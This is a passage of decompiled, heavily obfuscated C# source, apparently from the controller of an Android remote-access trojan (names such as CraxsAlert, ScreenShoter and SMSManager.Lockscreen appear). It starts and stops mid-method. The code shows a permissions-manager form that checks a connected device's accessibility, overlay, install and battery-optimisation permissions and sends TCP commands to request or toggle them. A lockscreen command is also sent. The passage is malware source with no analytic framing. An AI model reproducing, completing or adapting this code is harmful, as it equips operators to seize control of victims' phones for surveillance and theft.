              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u003120E2E24, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = -175175419;
              continue;
            case 22:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u00344447142, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = -47160559;
              continue;
            case 23:
              int num8;
              num3 = num8 = Operators.CompareString(strArray[12], EXGuarder.\u0037148401E, false) != 0 ? -2132024163 : (num8 = -303423165);
              continue;
            case 24:
              int num9;
              num3 = num9 = Operators.CompareString(strArray[3], EXGuarder.\u0037148401E, false) != 0 ? -1568970093 : (num9 = -1198326798);
              continue;
            case 25:
              num3 = (int) num4 * -73581089 ^ 1150801369;
              continue;
            case 26:
              num3 = (int) num4 * 455467879 ^ 986998996;
              continue;
            case 27:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0035254105B, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = 1921328913;
              continue;
            case 28:
              this.checkbattery.Enabled = true;
              num3 = (int) num4 * 1423964394 ^ 1434436740;
              continue;
            case 29:
              index6 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u00379405D0D, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -787486384 ^ 1598468385;
              continue;
            case 30:
              index5 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0030D6A4B78, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * 2069439781 ^ 398940709;
              continue;
            case 31:
              index12 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u00344447142, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -859782583 ^ -646806647;
              continue;
            case 32:
              goto label_6;
            case 33:
              index1 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u003120E2E24, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * 535011504 ^ 1557338422;
              continue;
            case 34:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0032C396B67, (object) EXGuarder.\u0033F2D644B)].Cells[2].Style.ForeColor = Color.Lime;
              ((ScreenShoter) this).install_prog = true;
              num3 = (int) num4 * 8663873 ^ 721019938;
              continue;
            case 35:
              ((ScreenShoter) this).battary_prog = true;
              this.checkbattery.Checked = false;
              num3 = (int) num4 * 2130967340 ^ 1222185290;
              continue;
            case 36:
              index2 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u003214B444A, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -148069577 ^ -1264322616;
              continue;
            case 37:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0032D256C13, (object) EXGuarder.\u0033F2D644B)].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 347702476 ^ 1429836112;
              continue;
            case 38:
              this.checkacess.Checked = false;
              num3 = (int) num4 * -917584603 ^ -343298866;
              continue;
            case 39:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0032A631915, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = 633043662;
              continue;
            case 40:
              this.DGVPRIM.Rows[index12].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * -1335172677 ^ -353806455;
              continue;
            case 41:
              num3 = (int) num4 * 984923823 ^ 1258186250;
              continue;
            case 42:
              ((ScreenShoter) this).draw_prog = true;
              num3 = (int) num4 * -299947252 ^ -1785171771;
              continue;
            case 43:
              index7 = this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u003675E0645, (object) EXGuarder.\u0032A646134);
              num3 = -1047014072;
              continue;
            case 44:
              index3 = this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u00355115A38, (object) EXGuarder.\u0032A646134);
              num3 = -273261153;
              continue;
            case 45:
              this.checkbattery.Checked = true;
              this.checkbattery.Enabled = false;
              num3 = (int) num4 * 1676746934 ^ 1308203116;
              continue;
            case 46:
              this.checkinstall.Checked = true;
              num3 = (int) num4 * 206157366 ^ 1618142604;
              continue;
            case 47:
              int num10;
              num3 = num10 = Operators.CompareString(strArray[10], EXGuarder.\u0037148401E, false) != 0 ? 661252324 : (num10 = 1433477165);
              continue;
            case 48:
              num3 = (int) num4 * 248814934 ^ -1290023458;
              continue;
            case 49:
              this.checkinstall.Enabled = true;
              num3 = (int) num4 * -1661697676 ^ -1513350854;
              continue;
            case 50:
              int num11;
              num3 = num11 = Operators.CompareString(strArray[8], EXGuarder.\u0037148401E, false) != 0 ? -1310951323 : (num11 = 1294878220);
              continue;
            case 51:
              int num12;
              num3 = num12 = Operators.CompareString(strArray[11], EXGuarder.\u0037148401E, false) != 0 ? 2103699738 : (num12 = -1492063981);
              continue;
            case 52:
              this.DGVPRIM.Rows[index11].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * -1921800904 ^ 1815854798;
              continue;
            case 53:
              this.checkdraw.Checked = false;
              this.checkdraw.Enabled = true;
              num3 = (int) num4 * 339336290 ^ -876178229;
              continue;
            case 54:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0031651650A, (object) EXGuarder.\u0033F2D644B)].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 2086629887 ^ 2116843922;
              continue;
            case 55:
              int num13;
              num3 = num13 = Operators.CompareString(strArray[7], EXGuarder.\u0037148401E, false) != 0 ? 12725707 : (num13 = -1711108928);
              continue;
            case 56:
              goto label_10;
            case 57:
              index8 = this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0031651650A, (object) EXGuarder.\u0032A646134);
              num3 = 1117633899;
              continue;
            case 58:
              int num14;
              num3 = num14 = Operators.CompareString(strArray[13], EXGuarder.\u0037148401E, false) != 0 ? 637848915 : (num14 = -1151085360);
              continue;
            case 59:
              this.DGVPRIM.Rows[index6].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 678197078 ^ 1446783383;
              continue;
            case 60:
              this.DGVPRIM.Rows[index1].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 1204887496 ^ 242372325;
              continue;
            case 61:
              index15 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u00310593A1F, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -1010988564 ^ 1607265266;
              continue;
            case 62:
              this.checkinstall.Checked = false;
              num3 = (int) num4 * 1397374003 ^ 1768853145;
              continue;
            case 63:
              this.DGVPRIM.Rows[index14].Cells[2].Style.ForeColor = Color.Red;
              num3 = (int) num4 * 1162124316 ^ 478468221;
              continue;
            case 64:
              this.DGVPRIM.Rows[index15].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 277722582 ^ -291955893;
              continue;
            case 65:
              index16 = this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0035254105B, (object) EXGuarder.\u0033F2D644B);
              num3 = (int) num4 * -1526077608 ^ 2097504724;
              continue;
            case 66:
              ((ScreenShoter) this).draw_prog = true;
              num3 = (int) num4 * 767721121 ^ 1348878641;
              continue;
            case 67:
              goto label_32;
            case 68:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u00379405D0D, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = -1885202867;
              continue;
            case 69:
              this.DGVPRIM.Rows[index5].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 1670021233 ^ -1844604951;
              continue;
            case 70:
              this.DGVPRIM.Rows[index16].Cells[2].Style.ForeColor = Color.Lime;
              ((ScreenShoter) this).battary_prog = true;
              num3 = (int) num4 * 849348605 ^ 1864485693;
              continue;
            case 71:
              ((ScreenShoter) this).Acces_prog = true;
              this.checkacess.Checked = true;
              num3 = (int) num4 * 972767712 ^ 466864770;
              continue;
            case 72:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap1, (object) EXGuarder.\u0030A1F4873, (object) EXGuarder.\u0033F2D644B)].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * 1328322335 ^ -1908937608;
              continue;
            case 73:
              int num15;
              num3 = num15 = Operators.CompareString(strArray[4], EXGuarder.\u0037148401E, false) != 0 ? -1768105946 : (num15 = 1056539011);
              continue;
            case 74:
              this.checkacess.Enabled = true;
              num3 = (int) num4 * -1923181504 ^ -969192000;
              continue;
            case 75:
              num3 = (int) num4 * 1644255867 ^ -492466962;
              continue;
            case 76:
              this.DGVPRIM.Rows[index13].Cells[2].Style.ForeColor = Color.Lime;
              num3 = (int) num4 * -1582454661 ^ 1220103582;
              continue;
            case 77:
              this.DGVPRIM.Rows[index4].Cells[2].Style.ForeColor = Color.Red;
              num3 = (int) num4 * -1919234386 ^ -1981720258;
              continue;
            case 78:
              this.checkinstall.Enabled = false;
              num3 = (int) num4 * 1346693566 ^ 1309625522;
              continue;
            case 79:
              int num16;
              num3 = num16 = Operators.CompareString(strArray[14], EXGuarder.\u0037148401E, false) != 0 ? -1419760043 : (num16 = 334847556);
              continue;
            case 80:
              int num17;
              num3 = num17 = Operators.CompareString(strArray[9], EXGuarder.\u0037148401E, false) != 0 ? 693520347 : (num17 = -596168481);
              continue;
            case 81:
              this.DGVPRIM.Rows[this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u003214B444A, (object) EXGuarder.\u0032A646134)].Cells[2].Style.ForeColor = Color.Red;
              num3 = -287537053;
              continue;
            case 82:
              this.DGVPRIM.Rows[index7].Cells[2].Style.ForeColor = Color.Red;
              num3 = (int) num4 * -703496449 ^ -242927696;
              continue;
            case 83:
              int num18;
              num3 = num18 = Operators.CompareString(strArray[2], EXGuarder.\u0037148401E, false) != 0 ? 1720435505 : (num18 = -522491463);
              continue;
            default:
              goto label_3;
          }
        }
label_6:
        return;
label_3:
        return;
label_32:
        index10 = this.DGVPRIM.Rows.Add((object) bitmap2, (object) EXGuarder.\u0031F255F4E, (object) EXGuarder.\u0032A646134);
        num3 = -276220120;
        goto label_11;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        return;
      }
label_7:
      strArray = (string[]) obj[0];
      num1 = this.DGVPRIM.Rows.Count <= 0 ? 564799041 : (num1 = -1900078855);
      goto label_2;
    }

    public void UpdateStatus(object[] obj)
    {
      if (!this.statustext.InvokeRequired)
        goto label_5;
label_1:
      int num1 = -1958625983;
label_2:
      string str;
      while (true)
      {
        int num2 = num1;
        uint num3;
        PermissionsManager.updatedele method;
        switch ((num3 = (uint) (-(-653608710 * -2057101037) + (-3793225 ^ -126496238 ^ -1967498426) - ((num2 ^ 713593421 * --2120225442) - (~-1348578800 - -796096652)))) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            this.statustext.Invoke((Delegate) method, (object) obj);
            num1 = (int) num3 * -1026706379 ^ -1682991138;
            continue;
          case 2:
            goto label_5;
          case 3:
            method = (PermissionsManager.updatedele) new PermissionsManager.recordnames(this.UpdateStatus);
            num1 = (int) num3 * -112931325 ^ -847925780;
            continue;
          case 4:
            this.statustext.Text = str;
            num1 = (int) num3 * 107919675 ^ -686725895;
            continue;
          case 5:
            num1 = (int) num3 * 2050065072 ^ 1357429980;
            continue;
          case 6:
            goto label_3;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_5:
      str = Conversions.ToString(obj[0]);
      num1 = -481830053;
      goto label_2;
    }

    private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
label_1:
      int num1 = 989579099;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 * 1142783291 - -(1852923221 * 1429850161 + ---650729357) + (--290332746 * -932436773 - ~(-801610712 * 191548801)))) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_7;
          case 2:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003436D700F + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00375304B66),
              (object) ((ScreenShoter) this).Classclient
            });
            num1 = (int) num2 * 1324880246 ^ 984473807;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num2 * -1517288526 ^ 2067962916;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0033236115F);
            num1 = (int) num2 * 652019679 ^ 1365254090;
            continue;
          default:
            goto label_8;
        }
      }
label_7:
      return;
label_8:;
    }

    private void Addactiv_Click(object sender, EventArgs e)
    {
      if (!(string.IsNullOrEmpty(this.comboproms.Text) | string.IsNullOrWhiteSpace(this.comboproms.Text)))
        goto label_8;
label_1:
      int num1 = 995508232;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~--num1 - ~(-1870407620 ^ -1983952410) - (-1582194283 ^ 1067851213) ^ 1893014288)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            this.comboproms.Text = EXGuarder.\u00315221918;
            num1 = (int) num2 * -449273368 ^ -1447977325;
            continue;
          case 2:
            CraxsAlert.Showinformation(EXGuarder.\u0033968180C);
            num1 = (int) num2 * 243640720 ^ 1899245243;
            continue;
          case 3:
            CraxsAlert.Showinformation(EXGuarder.\u003364A3E05);
            num1 = (int) num2 * -1562774597 ^ 841127662;
            continue;
          case 4:
            goto label_8;
          case 5:
            this.Primslist.Items.Add((object) this.comboproms.Text);
            num1 = 1071970029;
            continue;
          case 6:
            goto label_3;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:
      return;
label_8:
      num1 = !this.Primslist.Items.Contains((object) this.comboproms.Text) ? 434490193 : (num1 = 615713891);
      goto label_2;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      if (((ScreenShoter) this).Classclient == null)
        return;
      try
      {
        if (this.Primslist.Items.Count < 1)
        {
label_2:
          int num1 = -181918923;
          uint num2;
          switch ((num2 = (uint) ~((--820111292 + -(-(71334089 ^ -579326098) + (807283727 + 860528982 + (839421379 - 975009053))) - num1 ^ -914654875 * 2078986163) + --1391620009)) % 3U)
          {
            case 1:
              CraxsAlert.Showinformation(EXGuarder.\u0031950123D);
              return;
            case 2:
              goto label_2;
          }
        }
        string str = EXGuarder.\u00345641479;
        IEnumerator enumerator;
        try
        {
          enumerator = this.Primslist.Items.GetEnumerator();
label_6:
          int num3 = 1439675981;
          while (true)
          {
            int num4 = num3;
            uint num5;
            string Left;
            switch ((num5 = (uint) ~((--820111292 + -(-(71334089 ^ -579326098) + (807283727 + 860528982 + (839421379 - 975009053))) - num4 ^ -914654875 * 2078986163) + --1391620009)) % 26U)
            {
              case 0:
                str += EXGuarder.\u00363745B05;
                num3 = (int) num5 * -1266085859 ^ 78032861;
                continue;
              case 1:
                int num6;
                num3 = num6 = Operators.CompareString(Left, EXGuarder.\u0035467414C, false) != 0 ? 1158149761 : (num6 = 173010585);
                continue;
              case 2:
                int num7;
                num3 = num7 = Operators.CompareString(Left, EXGuarder.\u00321691725, false) != 0 ? 1719727174 : (num7 = 1708498553);
                continue;
              case 3:
                int num8;
                num3 = num8 = Operators.CompareString(Left, EXGuarder.\u00357052236, false) != 0 ? -229087555 : (num8 = 928363746);
                continue;
              case 4:
                str += EXGuarder.\u0033C60505B;
                num3 = (int) num5 * -901191113 ^ -1811512580;
                continue;
              case 5:
                str += EXGuarder.\u00334140626;
                num3 = (int) num5 * 466954408 ^ -261557196;
                continue;
              case 6:
                str += EXGuarder.\u00355435021;
                num3 = (int) num5 * -1553175753 ^ -1174612709;
                continue;
              case 7:
                Left = Conversions.ToString(enumerator.Current);
                int num9;
                num3 = num9 = Operators.CompareString(Left, EXGuarder.\u00345646601, false) != 0 ? 1605010502 : (num9 = 1156407348);
                continue;
              case 8:
                str += EXGuarder.\u003411F7221;
                num3 = (int) num5 * 304403359 ^ -838272558;
                continue;
              case 9:
                str += EXGuarder.\u00348147756;
                num3 = (int) num5 * 92144233 ^ 1171461154;
                continue;
              case 10:
                str += EXGuarder.\u00364681708;
                num3 = (int) num5 * -624555578 ^ 1569458071;
                continue;
              case 12:
                int num10;
                num3 = num10 = Operators.CompareString(Left, EXGuarder.\u003176A5D02, false) != 0 ? 857113313 : (num10 = -198221085);
                continue;
              case 13:
                str += EXGuarder.\u0032641446D;
                num3 = (int) num5 * -1742515499 ^ -2041147124;
                continue;
              case 14:
                str += EXGuarder.\u00351674D66;
                num3 = (int) num5 * 1807408935 ^ -146984355;
                continue;
              case 15:
                int num11;
                num3 = num11 = Operators.CompareString(Left, EXGuarder.\u003536E455B, false) != 0 ? 1350193659 : (num11 = -1569466051);
                continue;
              case 16:
                int num12;
                num3 = num12 = Operators.CompareString(Left, EXGuarder.\u003265E0114, false) != 0 ? 445204003 : (num12 = 1690550973);
                continue;
              case 17:
                str += EXGuarder.\u0034C4C6E63;
                num3 = (int) num5 * -163506757 ^ 317629055;
                continue;
              case 18:
                int num13;
                num3 = num13 = Operators.CompareString(Left, EXGuarder.\u0031D212860, false) != 0 ? 1373465772 : (num13 = -216094968);
                continue;
              case 19:
                int num14;
                num3 = num14 = Operators.CompareString(Left, EXGuarder.\u00341355508, false) != 0 ? 838592561 : (num14 = -1399597132);
                continue;
              case 20:
                num3 = (int) num5 * 1801789786 ^ -1130303995;
                continue;
              case 21:
                str += EXGuarder.\u0030E18093E;
                num3 = (int) num5 * 1866393362 ^ 1724657762;
                continue;
              case 22:
                int num15;
                num3 = num15 = enumerator.MoveNext() ? 67571164 : (num15 = 1844809380);
                continue;
              case 23:
                goto label_6;
              case 24:
                int num16;
                num3 = num16 = Operators.CompareString(Left, EXGuarder.\u00357242133, false) != 0 ? -1468484360 : (num16 = 1331038506);
                continue;
              case 25:
                int num17;
                num3 = num17 = Operators.CompareString(Left, EXGuarder.\u003360C2666, false) != 0 ? 412236544 : (num17 = -1519050655);
                continue;
              default:
                goto label_39;
            }
          }
        }
        finally
        {
          if (enumerator is IDisposable)
          {
label_35:
            int num18 = 1738530348;
            while (true)
            {
              int num19 = num18;
              uint num20;
              switch ((num20 = (uint) ~((--820111292 + -(-(71334089 ^ -579326098) + (807283727 + 860528982 + (839421379 - 975009053))) - num19 ^ -914654875 * 2078986163) + --1391620009)) % 3U)
              {
                case 0:
                  goto label_35;
                case 2:
                  (enumerator as IDisposable).Dispose();
                  num18 = (int) num20 * 1180066380 ^ -2143210402;
                  continue;
                default:
                  goto label_38;
              }
            }
          }
label_38:;
        }
label_39:
        // ISSUE: reference to a compiler-generated field
        TcpClient client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
        string[] strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((ScreenShoter) this).Classclient.SendMessage(new object[4]
        {
          (object) client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031C606C0C + str + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u0035D147325),
          (object) ((ScreenShoter) this).Classclient
        });
        // ISSUE: reference to a compiler-generated method
        AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0034E4F655B);
label_40:
        int num21 = -89998131;
        while (true)
        {
          int num22 = num21;
          uint num23;
          switch ((num23 = (uint) ~((--820111292 + -(-(71334089 ^ -579326098) + (807283727 + 860528982 + (839421379 - 975009053))) - num22 ^ -914654875 * 2078986163) + --1391620009)) % 3U)
          {
            case 0:
              goto label_40;
            case 1:
              goto label_33;
            case 2:
              this.Primslist.Items.Clear();
              num21 = (int) num23 * -207838789 ^ -395721750;
              continue;
            default:
              goto label_8;
          }
        }
label_33:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      if (this.Primslist.Items.Count == 0)
        goto label_7;
label_1:
      int num1 = -112451198;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) --~num1) % 8U)
        {
          case 0:
            this.Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Primslist.SelectedItem));
            num1 = (int) num2 * 873520735 ^ 780003060;
            continue;
          case 1:
            CraxsAlert.Showinformation(EXGuarder.\u00379413D3F);
            num1 = -1252149872;
            continue;
          case 2:
            CraxsAlert.Showinformation(EXGuarder.\u0031D724C24);
            num1 = -1252149872;
            continue;
          case 3:
            num1 = (int) num2 * -752209345 ^ -921867587;
            continue;
          case 4:
            goto label_1;
          case 5:
            goto label_7;
          case 6:
            int num3 = this.Primslist.SelectedItem == null ? 1875436498 : (num3 = 1245209115);
            num1 = num3 ^ (int) num2 * -1233339086;
            continue;
          case 7:
            goto label_3;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_7:
      num1 = this.Primslist.Items.Count <= 0 ? -948070579 : (num1 = -174142647);
      goto label_2;
    }

    private void Checkacess_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkacess.Enabled)
        return;
label_1:
      int num1 = 855982320;
      while (true)
      {
        int num2 = num1;
        uint num3;
        TcpClient client;
        string[] strArray;
        switch ((num3 = (uint) (-1628719162 - (--num2 - -(--821113976 - (-8691449 - -1466616876)) - (-585953959 * 1073862646 + --447969003)) * -1254524561)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u00376635E18);
            num1 = (int) num3 * -1227631463 ^ -1875350907;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            num1 = (int) num3 * 880844536 ^ 531847271;
            continue;
          case 3:
            int num4 = ((ScreenShoter) this).Classclient == null ? 900963779 : (num4 = 526954698);
            num1 = num4 ^ (int) num3 * -1642117203;
            continue;
          case 4:
            goto label_9;
          case 5:
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num3 * -1479968295 ^ 585723942;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031B703F58 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0032869552A),
              (object) ((ScreenShoter) this).Classclient
            });
            num1 = (int) num3 * -1993499695 ^ 772678227;
            continue;
          default:
            goto label_10;
        }
      }
label_9:
      return;
label_10:;
    }

    private void Checkdraw_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkdraw.Enabled)
        return;
label_1:
      int num1 = -1829350181;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string[] strArray;
        TcpClient client;
        switch ((num3 = (uint) (((--1524348681 - 1296761464 - -(115852581 * 1451090391) - (~857760761 - (1323796536 + -(1084424962 - -2031743005)) - num2 * -1217330911)) * -1290584371 + (1277812382 - 1669425137)) * -270103041)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            int num4 = ((ScreenShoter) this).Classclient == null ? -1619231553 : (num4 = -1647079010);
            num1 = num4 ^ (int) num3 * 761454292;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((ScreenShoter) this).Classclient).myClient;
            num1 = (int) num3 * 1224230574 ^ 1566467754;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated method
            AsyncLock.VB\u0024StateMachine_2_LockAsync.ShowSucess(EXGuarder.\u0035E374213);
            num1 = (int) num3 * 470654853 ^ -2042764705;
            continue;
          case 4:
            goto label_9;
          case 5:
            strArray = ((Data) ((ScreenShoter) this).Classclient).Keys.Split(':');
            num1 = (int) num3 * -1291327311 ^ 253833463;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((ScreenShoter) this).Classclient.SendMessage(new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00327164266 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((ScreenShoter) this).Classclient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0036E0F1F64),
              (object) ((ScreenShoter) this).Classclient
            });
            num1 = (int) num3 * 1866960504 ^ -1002054628;
            continue;
          default:
            goto label_10;
        }
      }
label_9:
      return;
label_10:;
    }

    private void checkbattery_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.checkbattery.Enabled)
        return;
label_1:
      int num1 = -1784717439;
      object[] ParametersObjects;
      TcpClient client;
      string[] strArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~(num1 + (~(~--2131689049 - (2125449790 - 583198804) * -1365199735) + (~-1837087156 + (250195618 - 1782576527) * 822682307 + ~-(1263575215 * -2132809133))))) % 8U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
